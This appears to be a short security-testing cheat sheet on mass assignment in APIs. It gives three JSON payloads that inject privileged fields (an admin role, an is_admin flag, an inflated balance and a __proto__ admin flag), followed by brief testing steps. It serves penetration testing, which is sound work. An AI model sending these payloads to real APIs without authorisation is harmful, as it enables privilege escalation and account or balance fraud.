# API Mass Assignment

## Summary
Test for mass assignment vulnerabilities in APIs.

## Payloads

```json
{"name":"test","email":"test@test.com","role":"admin"}
{"name":"test","is_admin":true}
{"name":"test","balance":999999,"__proto__":{"admin":true}}
```

## Testing
- Check API documentation for available fields
- Add extra fields that affect behavior
- Try nested object manipulation
